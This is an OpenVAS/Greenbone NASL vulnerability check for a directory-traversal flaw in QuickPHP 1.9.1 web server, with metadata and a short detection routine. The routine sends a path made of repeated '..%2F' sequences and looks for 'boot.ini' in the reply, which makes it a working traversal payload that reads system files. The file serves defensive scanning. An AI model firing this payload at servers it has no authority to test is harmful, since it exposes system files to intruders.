###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quickphp_45603.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# QuickPHP Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103003");
  script_version("$Revision: 12018 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
  script_bugtraq_id(45603);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("QuickPHP Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45603");
  script_xref(name:"URL", value:"http://www.zachsaw.co.cc/?pg=quickphp_php_tester_debugger");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/QuickPHP.Web.Server.1.9.1.Directory.Traversal/72");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 5723);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"QuickPHP is prone to a directory-traversal vulnerability because it
fails to sufficiently sanitize user-supplied input.

A remote attacker may leverage this issue to retrieve arbitrary files
in the context of the affected application, potentially revealing
sensitive information that may lead to other attacks.

QuickPHP 1.9.1 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:5723);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

url = string("http://192.168.2.7/",crap(data:"..%2F",length:10*5));

if(http_vuln_check(port:port, url:url,pattern:"boot\.ini")) {

  security_message(port:port);
  exit(0);

}

exit(0);
